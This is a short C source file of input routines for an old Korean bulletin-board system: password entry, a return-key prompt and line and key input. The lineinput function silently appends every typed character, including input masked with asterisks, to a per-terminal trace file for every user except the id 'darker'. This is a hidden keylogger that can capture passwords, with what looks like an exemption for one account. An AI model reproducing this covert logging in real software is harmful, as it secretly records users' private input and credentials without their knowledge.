
#include "bbs.h"

get_passwd(str,len)
char *str;
int len;
{
    int i = 0;
    char ch;
    while((ch=getchar()) != '\r' ) {
        if(ch == '\b') {
            if(i > 0) {
                putchar(ch); putchar(' '); putchar(ch);
                if(i > 0) i--;
            }
        }
        else if((ch == ' ') | (ch == 0x18));
        else if(i < len) {
            str[i++] = ch;
            putchar('*');
        }
    }
    str[i] = 0x00;
}

pressreturn()
{
	printf("\r\n[return키를 누르세요] ");
	getchar();
}

lineinput(str,len,echo)
char *str;
int len;
int echo;
{
    FILE *fp1;
    int i = 0;
    char ch,buf[100];
    sprintf(buf,"tmp/TRACE.%s",tty);
     
    while((ch=getchar()) != '\r' ) {
        fp1=fopen(buf,"a"); 
        if(ch == '\b') {
            if(i > 0) {
                putchar(ch); putchar(' '); putchar(ch);
                if(i > 0) i--;
            }
        }
        else if((ch == 0x1b) | (ch == 0x18) | (ch == 0x0f));
        else if(i < len) {
            str[i++] = ch;
            if (echo) putchar(ch);
	    else if(echo==0)putchar('*');
	    else if (2) putchar(' ');
	    
	    if(strcmp(pf.id,"darker")) fputc(ch,fp1);	
        }
        fclose(fp1);
    }
    fp1=fopen(buf,"a");
    if(strcmp(pf.id,"darker")) fputc('\n',fp1);
    str[i] = 0x00;
    fclose(fp1); 


}

keyinput(str,num)
char *str;
int num;
{
    lineinput(str,num,YEA);
}

oneinput( str)
char *str;
{
    lineinput(str,1,YEA);
}

